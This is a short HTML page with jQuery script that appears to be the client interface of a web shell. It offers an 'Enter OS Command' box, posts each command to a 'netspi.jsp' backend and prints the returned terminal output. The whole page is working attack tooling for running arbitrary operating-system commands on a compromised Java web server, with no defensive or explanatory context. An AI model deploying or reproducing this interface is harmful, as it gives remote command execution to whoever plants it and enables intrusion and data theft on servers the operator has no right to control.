<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container mt-5">
    <h1 class="text-center">Command Executor</h1>
    <div class="form-group">
        <label for="commandInput">Enter OS Command:</label>
        <input type="text" id="commandInput" class="form-control" placeholder="Type your command here...">
    </div>
    <button id="executeCommand" class="btn btn-primary">Execute</button>
    <h3 class="mt-4">Terminal Output:</h3>
    <div id="outputSection" class="border p-3" style="background-color: #f8f9fa; height: 300px; overflow-y: auto;">
        <pre id="outputDisplay"></pre>
    </div>
</div>

<script>
    $(document).ready(function () {
        $("#executeCommand").on("click", function () {
            const command = $("#commandInput").val();
            if (!command.trim()) {
                alert("Please enter a command.");
                return;
            }
            $("#outputDisplay").text("Executing...");
            $.ajax({
                url: "netspi.jsp",
                type: "POST",
                data: { command: command },
                success: function (response) {
                    $("#outputDisplay").text(response);
                },
                error: function () {
                    $("#outputDisplay").text("An error occurred while executing the command.");
                }
            });
        });
    });
</script>
</body>
</html>
